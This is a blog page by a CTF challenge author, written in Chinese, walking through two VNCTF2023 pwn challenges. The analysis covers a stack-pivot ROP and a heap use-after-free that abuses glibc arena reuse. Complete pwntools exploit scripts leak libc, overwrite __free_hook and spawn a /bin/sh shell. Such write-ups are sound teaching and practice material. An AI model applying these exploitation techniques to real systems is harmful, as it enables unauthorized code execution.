@@ -1,0 +1,792 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>VNCTF2023出题手记 | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="VNCTF2023出题手记 | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="前言
+学pwn也有一年了，这还是第一次较为正式的参与比赛的出题。介于本人技术有限，所以两题的难度都不高。
+（而且由于经验不足，导致这次我的两题给很多师傅带来了不好的体验，在这里给各位师傅们真诚地磕一个）
+（问卷反馈的最爱&amp;最恨的to..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              VNCTF2023出题手记
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-02-20
+              </span>
+              <span>
+                17 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>学pwn也有一年了，这还是第一次较为正式的参与比赛的出题。介于本人技术有限，所以两题的难度都不高。</p>
+<p>（而且由于经验不足，导致这次我的两题给很多师傅带来了不好的体验，在这里给各位师傅们真诚地磕一个）</p>
+<p>（问卷反馈的最爱&amp;最恨的top2都是traveler和鼠鼠的奇妙冒险）</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/20/63dae4cd8c85c.png" alt="1676823882674.png" loading="lazy"></figure>
+<h1 id="traveler">traveler</h1>
+<blockquote>
+<p>人的一生能有多少次旅行呢</p>
+</blockquote>
+<h2 id="分析">分析</h2>
+<p>保护只开了NX，main函数很明显的栈溢出。</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init(argc, argv, envp);
+  puts(&quot;who r u?&quot;);
+  read(0, buf, 0x30uLL);
+  puts(&quot;How many travels can a person have in his life?&quot;);
+  read(0, &amp;msg, 0x28uLL);
+  return 0;
+}
+</code></pre>
+<p>buf处溢出覆盖rbp之后还能写下一个gadget，并且往msg读了0x28。很明显的栈迁起手式。</p>
+<p>因为没有使用去掉csu的版本，所以gadget方面是几乎没有限制的，</p>
+<pre><code class="language-sh">&gt; ROPgadget --binary ./traveler | grep pop
+0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000401176 : mov byte ptr [rip + 0x2f0b], 1 ; pop rbp ; ret
+0x00000000004011da : nop ; pop rbp ; ret
+0x00000000004012bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012be : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012c0 : pop r14 ; pop r15 ; ret
+0x00000000004012c2 : pop r15 ; ret
+0x00000000004012bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004012bf : pop rbp ; pop r14 ; pop r15 ; ret
+0x000000000040117d : pop rbp ; ret
+0x00000000004012c3 : pop rdi ; ret
+0x00000000004012c1 : pop rsi ; pop r15 ; ret
+0x00000000004012bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</code></pre>
+<p>起system的话，ROP的构造如下：</p>
+<p><code>b'/bin/sh\x00' + p64(pop_rdi) + p64(binsh_addr) + p64(elf.symbols['system'])</code></p>
+<p>只需要0x20的长度即可。</p>
+<p>但msg位于.bss的开头，直接起system的话，rsp会减到前面的.got里，然后就会导致crash。</p>
+<p>所以考点就在于：</p>
+<ol>
+<li>msg位于bss段开头，如果直接在这里起system，栈空间不够</li>
+<li>只有0x28如何写下rop</li>
+</ol>
+<p>先来解决第一个问题，如何在.bss中留够栈空间。</p>
+<p>这个估计是该题唯一的难点了，但其实也很容易想到，只需要用这0x28的rop调用read，控制rsi为当前rop的结束位置，读入下一段rop并让rsp顺利滑到下一个rop上即可。</p>
+<p>光是这么说可能有点抽象，可以看下面这个示意图。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/02/10/12e62896b1adb.png" alt="1676006538909.png" loading="lazy"></figure>
+<p>重复用这些read来不断抬高rsp，当次数足够时，system的栈空间就留够了。</p>
+<p>然后再来看第二个问题，0x28如何写下read。</p>
+<p>其实很容易看出来，main函数在返回前调用了<code>read(0, &amp;msg, 0x28)</code>，rdi和rdx都已经不用管了，只需要控制rsi为<code>msg+0x28*i</code>就行了。所以有如下构造：</p>
+<p><code>p64(pop_rsi_r15) + p64(bss+0x28*i) + p64(0) + p64(elf.symbols['read']) + p64(ret)</code></p>
+<p>刚好用0x28，且rsp也能滑到下一个rop上。</p>
+<p>（<del>你看他从栈迁到不断抬栈，像不像经历了许多次旅行</del>）</p>
+<p>在看了师傅们交上来的wp之后，发现了许多非预期的解法，比如复用main函数代码的就有两种思路，①第一次溢出劫持rsi和rbp之后重新回到<code>0x401244</code>或②在第一次溢出劫持rbp后直接返回<code>0x4012116</code>来劫持rsi，这两种方法都能直接把rop读到bss高位然后借用main本身的function epilogue自然而然的迁移过去。</p>
+<p>（优雅，实在是太优雅了.jpg）</p>
+<p>还有一位师傅直接使用puts leak出libc之后强行在rop中满足了ogg的条件并调用了ogg来getshell（绝）。</p>
+<p>（和这些解法比起来，出题人的预期解低效且丑陋，反而变得更像是非预期了）</p>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+
+context.log_level='debug'
+
+path_to_elf = '/home/kotori/Desktop/vnctf/traveler/traveler'
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+elf = ELF(path_to_elf)
+
+if port == 0:
+	p = process(path_to_elf)
+else:
+	p = remote(ip, port)
+
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+bss = 0x4040a0
+leave_ret = 0x0000000000401253 # leave ; ret
+pop_rdi = 0x00000000004012c3 # pop rdi ; ret
+pop_rsi_r15 = 0x00000000004012c1 # pop rsi ; pop r15 ; ret
+ret = pop_rdi + 1
+
+pay = b'a'*0x20 + p64(bss-0x8) + p64(leave_ret)
+p.sendafter('u?', pay)
+
+pay = p64(pop_rsi_r15) + p64(bss+0x28) + p64(0)
+pay += p64(elf.plt['read']) + p64(ret)
+
+# g()
+
+p.sendafter('e?', pay)
+
+for i in range(2,60):
+	pay = p64(pop_rsi_r15) + p64(bss+(0x28*i)) + p64(0)
+	pay += p64(elf.plt['read']) + p64(ret)
+	p.send(pay)
+
+pay = p64(ret) + p64(pop_rdi) + p64(bss+0x7c8+10*0x28) + p64(elf.symbols['system'])
+pay += b'/bin/sh\x00'
+p.sendline(pay)
+
+p.interactive()
+</code></pre>
+<h1 id="鼠鼠的奇妙冒险">鼠鼠的奇妙冒险</h1>
+<blockquote>
+<p>我的梦想是成为鼠中gangstar!</p>
+</blockquote>
+<h2 id="分析-2">分析</h2>
+<p>考虑到比赛时间只有12h且pwn方向题目较多，所以为了减少逆向难度，我直接把源码全部给出来了（不会开发，代码写的比较答辩还请师傅们海涵）</p>
+<p>保护全开，为了方便师傅们调试，编译的时候带了符号。</p>
+<p>最主要的漏洞点应该还是很好找的，位于<code>game.c</code>的<code>fight</code>中。</p>
+<pre><code class="language-c">uint32_t fight(mouse_t *a, mouse_t *b) {
+    
+	......
+    
+	switch(sig) {
+		case F_WIN:
+            
+			......
+			
+			free(b);
+			
+			// especial mouse will do sth here...
+			// ...
+			if(b-&gt;type == LOST_MOUSE) {
+				printf(&quot;[lost mouse] I lost my name in a duel in the past.\n&quot;);
+				printf(&quot;[lost mouse] Can you help me find my original name? (y/N)\n&quot;);
+				printf(&quot;[%s]&quot;, a-&gt;name);
+				read(0, buf, 2);
+				
+				if(buf[0] == 'y' || buf[0] == 'Y') {
+					printf(&quot;[lost mouse] I only remember that&quot;
+						&quot; my name has 2 characters.\n&quot;);
+					printf(&quot;[%s] &quot;, a-&gt;name);
+					read(0, b-&gt;name, 2);
+					
+					......
+                        
+				}
+			}
+            ......
+                
+    }
+
+    ......
+                
+}
+</code></pre>
+<p>这里在<code>free(b)</code>之后，如果对方是<code>LOST_MOUSE</code>，就能够直接uaf写2bytes。</p>
+<p>暂且不看这里如何利用，先看看如何到达这个有漏洞的代码部分。</p>
+<p>整个游戏中调用了<code>fight()</code>的只有<code>loadLevel()</code>和<code>dummyFight()</code>，不过要遇到type为<code>LOST_MOUSE</code>的敌人，就只有走<code>dummyFight()</code>这条链子，即：</p>
+<p><code>arena() -&gt; dummyArena() -&gt; dummyFight() -&gt; fight()</code></p>
+<p>想要从进入<code>dummyArena()</code>，还需要满足<code>eeee-&gt;attr &amp; S_CLONE</code>。</p>
+<pre><code class="language-c">case 0:
+			if(eeee-&gt;attr &amp; S_CLONE) {
+				dummyArena();
+				break;
+			}
+</code></pre>
+<p>在<code>mouse.c</code>的<code>useItemImpl()</code>中可以看到，使用道具<code>book3</code>就能获得这个技能。</p>
+<pre><code class="language-c">else if(!strcmp(obj, &quot;book3&quot;)) {
+	_this-&gt;attr |= S_CLONE;
+					
+	printf(&quot;[God] %s learned new skill: &quot;
+	&quot;\033[33mclone\033[m.\n&quot;, _this-&gt;name);
+}
+</code></pre>
+<p>不过想要获得<code>book3</code>，需要大量的coin。</p>
+<pre><code class="language-c">static shopItem_t shop_list[0x8] = {
+	{&quot;sword&quot;, 5},
+	{&quot;shield&quot;, 5},
+	{&quot;nameTag&quot;, 68},
+	{&quot;book1&quot;, 98},
+	{&quot;book2&quot;, 198},
+	{&quot;book3&quot;, 0x114514},
+	{&quot;potion1&quot;, 5},
+	{&quot;potion2&quot;, 30},
+};
+</code></pre>
+<h3 id="step1-打怪刷钱">step1. 打怪刷钱</h3>
+<p>为了买到<code>book3</code>，首先就需要刷钱。</p>
+<pre><code class="language-c">typedef struct MouseAttr {
+	uint32_t hp;
+	uint32_t atk;
+	uint32_t coin;
+	uint32_t attr;
+	
+	char     mayUse[0x10];
+} mouseAttr_t;
+
+static mouseAttr_t attr_list[0x8] = {
+	{0xeeeea, 0xeeeea, 0xeeeea, S_FIRE|S_HEAL, &quot;eeee&quot;},
+	{13, 10, 0, 0, &quot;&quot;},
+	{1, 0, 0, 0, &quot;dummy%04u&quot;},
+	{10, 5, 1, 0, &quot;normal mouse&quot;},
+	{11, 6, 2, 0, &quot;armed mouse&quot;},
+	{50, 20, 4, 0, &quot;elite mouse&quot;},
+	{80, 80, 0, 0, &quot;lost mouse&quot;},
+};
+</code></pre>
+<p>击败<code>BOSS_MOUSE</code>，一次就可以获得0xeeeea的coin，这无疑是最快速的刷钱方法。</p>
+<p>不过我们<code>HERO_MOUSE</code>的<code>atk</code>和<code>hp</code>都远远比不过<code>BOSS_MOUSE</code>，所以需要使用一些小手段。</p>
+<p>同样是在<code>useItemImpl()</code>中，会发现一处off by one的查找，</p>
+<pre><code class="language-c">void useItemImpl(mouse_t *_this, char *obj) {
+	int i = 0;
+	for( ; i &lt;= BAG_CAP; ++i) {  // off by one
+		if(!strncmp(obj, _this-&gt;bag[i].name, 8)) {
+			if(_this-&gt;bag[i].attr &amp; I_USEABLE) {
+				if(_this-&gt;bag[i].count == 0) {
+					puts(&quot;[God] You don't have that.&quot;);
+					return;
+				}
+                ......
+                    
+			}
+			--_this-&gt;bag[i].count;
+			printf(&quot;[God] you used %s, leave %u.\n&quot;, \
+				_this-&gt;bag[i].name, _this-&gt;bag[i].count);
+		}
+	}
+}
+</code></pre>
+<p>再结合一下<code>mouse_t</code>和<code>item_t</code>的结构</p>
+<pre><code class="language-c">typedef struct Item {
+	char name[0x8];
+	uint32_t attr;
+	uint32_t count;
+} item_t;
+
+typedef struct Mouse {
+	char name[0x10];
+	item_t  bag[BAG_CAP];
+	
+	uint32_t id;
+	uint32_t type;
+	uint32_t hp;
+	uint32_t atk;
+	uint32_t coin;
+	uint32_t attr;
+	
+	void*  (*initBag)(struct Mouse *_this);
+	void*  (*useItem)(struct Mouse *_this, char *obj);
+	void*  (*queryStat)(struct Mouse *_this);
+	void*  (*buyGoods)(struct Mouse *_this, char *obj);
+} mouse_t;
+</code></pre>
+<p>bag这里的off by one，会把接下来的<code>{id, type, hp, atk}</code>当做<code>item_t</code>来解析，即<code>{id, type}</code>作为<code>item_t-&gt;name</code>，<code>hp</code>作为<code>item_t-&gt;attr</code>，<code>atk</code>作为<code>item_t-&gt;count</code>。</p>
+<p>也就是说如果已知我们自己的<code>id</code>和<code>type</code>，然后让<code>_this-&gt;bag[i].attr &amp; I_USEABLE</code>为0，</p>
+<p>就能借用他的<code>--_this-&gt;bag[i].count;</code>来负数溢出我们的<code>atk</code>。</p>
+<p>溢出到<code>(unsigned)-1</code>之后，就能轻松打赢<code>BOSS_MOUSE</code>，然后刷钱了。</p>
+<h3 id="step2-dummyarena与利用的开端">step2. dummyArena与利用的开端</h3>
+<p>拿到足够的钱之后，去商店购买<code>book3</code>和<code>nameTag</code>（这个为以后做准备）。</p>
+<p>使用<code>book3</code>学会技能<code>clone</code>之后进入<code>dummyArena</code>，</p>
+<p>至此，该题的前戏部分结束，从这里开始分析最终的利用思路。</p>
+<p>在<code>dummyFight</code>中，如果你的对手是<code>NORMAL_MOUSE</code>，就会触发与隐藏的<code>LOST_MOUSE</code>的战斗。</p>
+<pre><code class="language-c">if(ene-&gt;type == NORMAL_MOUSE) {
+	hiden_ene = malloc(sizeof(mouse_t));
+	initMouse(hiden_ene, LOST_MOUSE);
+}
+	......
+
+if(ene-&gt;type == NORMAL_MOUSE \
+	&amp;&amp; fight(dummy, hiden_ene)) {
+	return ;
+}
+</code></pre>
+<p>且<code>dummyArena</code>中提供了任意次数随机敌人类型的功能，可以保证想要的线程对上<code>LOST_MOUSE</code></p>
+<pre><code class="language-c">srand((unsigned)time(NULL));
+dummyLevelEnemies[0] = dummyNum;
+	
+do {
+		
+	for(i = 1; i &lt; dummyLevelEnemies[0]; ++i) {
+		dummyLevelEnemies[i] = rand()%3+3;
+	}
+		
+	printf(&quot;[God] your dummies will fight with:\n&quot;);
+	for(i = 1; i &lt; dummyLevelEnemies[0]; ++i) {
+		printf(&quot;\033[34m(%u) %s\033[m, &quot;, \
+			i, attr_list[dummyLevelEnemies[i]].mayUse);
+		if(i % (winCol/22) == 0)
+			putchar(0x0A);
+	}
+	
+	printf(&quot;\n[God] sure?(y/N)\n&quot;);
+	printf(&quot;[%s] &quot;, eeee-&gt;name);
+	
+	read(0, buf, 2);
+	
+} while(buf[0]!='y' &amp;&amp; buf[0]!='Y');
+</code></pre>
+<p>我们创建的线程数也是可控的。</p>
+<pre><code class="language-c">for(i = 1; i &lt; dummyNum; ++i) {
+		pthread_create(&amp;dummyThread[i], NULL, dummyFight, (uint32_t *) &amp;i);
+		usleep(10000);
+}
+</code></pre>
+<p>一个常识，<code>ptmalloc2</code>针对多线程一般是一个线程对应一个arena，不过在<strong>线程数&gt;CPU核心数*8</strong>时（在x64下），又会尝试去对之前使用过的arena加lock，然后继续使用。（假设这个docker环境的核心数是2，那么第17个线程就会尝试对main_arena上锁并使用他的空间）</p>
+<p>（这也是我让菜单显示选择ARENAS(竞技场)的原因，他其实带有一定的暗示是和glibc的arena相关的trick了hh）</p>
+<p>此时，再结合2byte的uaf这个洞，是否隐约可以联想到一些东西了。</p>
+<p>在使用tcache的glibc版本中，每个线程都会有一个<code>tcache_pthread_struct</code>，并且在线程结束时会调用<code>tcache_thread_shutdown</code>。</p>
+<pre><code class="language-c">static void
+tcache_thread_shutdown (void)
+{
+  int i;
+  tcache_perthread_struct *tcache_tmp = tcache;
+
+  if (!tcache)
+    return;
+
+  /* Disable the tcache and prevent it from being reinitialized.  */
+  tcache = NULL;
+  tcache_shutting_down = true;
+
+  /* Free all of the entries and the tcache itself back to the arena
+     heap for coalescing.  */
+  for (i = 0; i &lt; TCACHE_MAX_BINS; ++i)
+    {
+      while (tcache_tmp-&gt;entries[i])
+	{
+	  tcache_entry *e = tcache_tmp-&gt;entries[i];
+	  tcache_tmp-&gt;entries[i] = e-&gt;next;
+	  __libc_free (e);
+	}
+    }
+
+  __libc_free (tcache_tmp);
+}
+</code></pre>
+<p>它会遍历每个entries，然后free掉所有结点。</p>
+<p>借用2bytes的uaf，可以达成对部分位置的free。但是由于2bytes的局限性，只能在原来next指针附近找。</p>
+<p>所以这个时候，如果该线程是和main_arena共用内存的，那么就可以free掉自己，再配合改名卡就能劫持到next指针。</p>
+<p>在每个己方mouse出生的时候都会给出一个坐标，</p>
+<pre><code class="language-c">uint32_t position(mouse_t *m, int pos) {
+	return (((uint64_t)m &gt;&gt; (pos*8)) &amp; 0xFFFF) ^ 0xBAAD;
+}
+</code></pre>
+<p>对该坐标进行简单解密即可得到堆上的位置。</p>
+<p>可以借用这个gift判断服务器环境是第几个线程开始复用main_arena，也可以借用他判断自己的位置和该dummy的位置是否只有最后2bytes不同（如果超过2bytes了，那么就可以重开游戏了，不过这个概率并不大）</p>
+<p>还需要注意的是，free自己的时候，自己的name的前8bytes一定要是<code>\x00\x00\x00\x00\x00\x00\x00\x00</code>，不然<code>tcache_thread_shutdown</code>会把这个name当指针去free下一个chunk，大概率会段错误。</p>
+<p>因此在原题中我也加了这个判断，</p>
+<pre><code class="language-c">if(*((uint64_t**) (b-&gt;name))[0] == O_NAME) {  // O_NAME == 0
+	printf(&quot;[%2s] that's my name!\n&quot;, b-&gt;name);
+	printf(&quot;[%2s] thank you very much!\n&quot;, b-&gt;name);
+						
+}
+else {
+	*((uint64_t *) b-&gt;name) = O_NAME;
+	printf(&quot;[  ] That's not my name. &quot;
+		&quot;Maybe I will remember it at the end of my life.\n&quot;);
+}
+</code></pre>
+<h3 id="step3-完成后续的利用">step3. 完成后续的利用</h3>
+<p>free掉自己之后，main_arena的bins结构如下：</p>
+<pre><code>pwndbg&gt; bins
+tcachebins
+0x20 [  2]: 0x55c68921e920 —▸ 0x55c68921e2a0 ◂— 0x0
+0xd0 [  1]: 0x55c689229d50 ◂— 0x0
+0x120 [  7]: 0x55c68922a4e0 —▸ 0x55c68922a3c0 —▸ 0x55c68922a2a0 —▸ 0x55c68922a180 —▸ 0x55c68922a060 —▸ 0x55c689229f40 —▸ 0x55c689229e20 ◂— 0x0
+0x1e0 [  1]: 0x55c68921eeb0 ◂— 0x0
+0x370 [  1]: 0x55c68921eb40 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x55c68922a5f0 —▸ 0x55c68922c210 —▸ 0x55c689229c70 —▸ 0x7ff7c1b65be0 (main_arena+96) ◂— 0x55c68922a5f0
+smallbins
+empty
+largebins
+empty
+</code></pre>
+<p>我们自己的chunk被放入了unsortedbin，且fd就是libc上的地址，所以可以直接通过查询status来leak libc。</p>
+<p>然后为了能够打tcache的任意申请，还需要调整一下bin，让这个chunk到tcache bin里去。</p>
+<p>这个时候可以借用只有2个enemies的level2，</p>
+<pre><code class="language-c">static uint32_t enemies[LEVELS][LEVEL_MAX_NUM] = {
+	{1, NORMAL_MOUSE, USELESS, USELESS, USELESS, USELESS},
+	{2, ARMED_MOUSE, ARMED_MOUSE, USELESS, USELESS, USELESS},
+	{1, BOSS_MOUSE, USELESS, USELESS, USELESS, USELESS}
+};
+
+uint32_t levelEnemies[LEVEL_MAX_NUM];
+uint32_t dummyLevelEnemies[LEVEL_MAX_NUM_DUMMY];
+
+mouse_t *ene[LEVEL_MAX_NUM];
+</code></pre>
+<pre><code class="language-c">void loadLevel(uint32_t lev) {
+	int i;
+	--lev;
+	for(i = 0; i &lt; LEVEL_MAX_NUM; ++i) {
+		levelEnemies[i] = enemies[lev][i];
+	}
+	
+	// generate enemies
+	for(i = 1; i &lt;= levelEnemies[0]; ++i) {
+		ene[i] = malloc(sizeof(mouse_t));
+		initMouse(ene[i], levelEnemies[i]);
+	}
+	
+	for(i = 1; i &lt;= levelEnemies[0]; ++i) {
+		fight(eeee, ene[i]);
+		
+		sleep(1);
+	}
+}
+</code></pre>
+<p>分别malloc和free了两个mouse_t变量之后，我们自己的chunk就来到tcache 0xd0那条entries的头部了，非常舒服。这个时候使用之前囤好的<code>nameTag</code>，就可以劫持next指针了。</p>
+<p>remake功能会重新malloc内存，然后送改名卡。</p>
+<pre><code class="language-c">void remake() {
+	printf(&quot;[God] you wanna remake?\n&quot;);
+	printf(&quot;[God] okay, I'll satisfy you.\n&quot;);
+	
+	char *tmp = eeee-&gt;name;
+	
+	eeee = malloc(sizeof(mouse_t));
+	
+	initMouse(eeee, HERO_MOUSE);
+	strncpy(eeee-&gt;name, tmp, strlen(tmp));
+	
+	printf(&quot;[God] ...and I'll give you a nameTag.\n&quot;);
+	++eeee-&gt;bag[2].count;
+}
+</code></pre>
+<p>我这里是选择劫持<code>__free_hook-0x8</code>，然后重开两次并改名字为<code>b'/bin/sh\x0A' + p64(system_addr)</code></p>
+<p>不用<code>/bin/sh\x00</code>是因为会截断改名卡中的strncpy。</p>
+<p>最后退出游戏，利用<code>doExit()</code>中的free即可getshell。</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+
+context.log_level = 'debug'
+
+path_to_elf = '/home/kotori/Desktop/vnctf/rats/rats'
+
+ip = sys.argv[1]
+port = int(sys.argv[2])
+
+elf = ELF(path_to_elf)
+libc = elf.libc
+
+if port == 0:
+	p = process(path_to_elf)
+else:
+	p = remote(ip, port)
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	if port != 0:
+		return
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(op):
+	sla('choice: ', str(op))
+
+def arena(op):
+	choice(1)
+	choice(str(op))
+
+def buy(obj):
+	choice(2)
+	sla('want a', obj)
+
+def use(obj):
+	choice(3)
+	choice(1)
+	ru('use?\n')
+	sa(']', obj)
+
+def leak_heap(x, y, z):
+	ret = (z ^ 0xBAAD)&lt;&lt;16
+	ret = (ret + y ^ 0xBAAD)&lt;&lt;16
+	ret += x ^ 0xBAAD
+	return ret
+
+sa('&gt; Press any key to start &lt;', b'\x0A')
+sa('name is: ', b'\x00'*0x10)
+
+ru(': (')
+xx = int(ru(', ')[:-2])
+yy = int(ru(', ')[:-2])
+zz = int(ru(').')[:-2])
+
+eeee_addr = leak_heap(xx, yy, zz)
+print(hex(eeee_addr))
+
+arena(1)
+
+# overflow atk
+for i in range(11):
+	use(p32(1)+p32(1))
+
+# get coins
+for i in range(3):
+	arena(3)
+
+# learn clone
+buy('book3')
+buy('nameTag')
+buy('nameTag')
+use('book3\n')
+
+num = 17 # 33
+
+arena(0)
+sla('summon?', str(num))
+
+content = ru('sure?')
+target = '({}) normal mouse'.format(num-1)
+print(target)
+
+while bytes(target, encoding='UTF-8') not in content:
+	p.sendline('n')
+	content = ru('sure?')
+
+sla('(y/N)', 'y')
+
+ru('[God] dummy00{} is spanned at the position: ('.format(num-1))
+xx = int(ru(', ')[:-2])
+yy = int(ru(', ')[:-2])
+zz = int(ru(').')[:-2])
+
+dummy_addr = leak_heap(xx, yy, zz)
+print(hex(dummy_addr))
+
+assert (eeee_addr&gt;&gt;16) == (dummy_addr&gt;&gt;16)
+
+ru('[dummy00')
+idx = p.recv(2)
+while idx != bytes(str(num-1), encoding='UTF-8'):
+	p.send('\x0A')
+	ru('[dummy00')
+	idx = p.recv(2)
+
+p.sendline('y')
+sa('[dummy00{}]'.format(num-1), p16(eeee_addr &amp; 0xFFFF))
+
+for i in range(31):
+	p.sendline('n')
+
+choice(3)
+
+libc_addr = u64(ru(b'\x7f')[-6:].ljust(0x8, b'\x00')) - 0x1ecbe0
+print(hex(libc_addr))
+
+free_hook = libc_addr + libc.symbols['__free_hook']
+sys = libc_addr + libc.symbols['system']
+
+choice(2)
+
+# unsortedbin -&gt; tcache bin
+arena(2)
+
+use('nameTag\n')
+sa('name:', p64(free_hook-0x8))
+
+choice(4)
+choice(4)
+
+use('nameTag\n')
+sa('name:', b'/bin/sh\x0A' + p64(sys))
+
+g()
+
+choice(5)
+
+p.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#traveler">traveler</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析</a></li>
+<li><a href="#exp">exp</a></li>
+</ul>
+</li>
+<li><a href="#%E9%BC%A0%E9%BC%A0%E7%9A%84%E5%A5%87%E5%A6%99%E5%86%92%E9%99%A9">鼠鼠的奇妙冒险</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析</a>
+<ul>
+<li><a href="#step1-%E6%89%93%E6%80%AA%E5%88%B7%E9%92%B1">step1. 打怪刷钱</a></li>
+<li><a href="#step2-dummyarena%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BC%80%E7%AB%AF">step2. dummyArena与利用的开端</a></li>
+<li><a href="#step3-%E5%AE%8C%E6%88%90%E5%90%8E%E7%BB%AD%E7%9A%84%E5%88%A9%E7%94%A8">step3. 完成后续的利用</a></li>
+</ul>
+</li>
+<li><a href="#exp-2">exp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/CVE-2021-4034/">
+              <h3 class="post-title">
+                CVE-2021-4034 Polkit-Pkexec
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
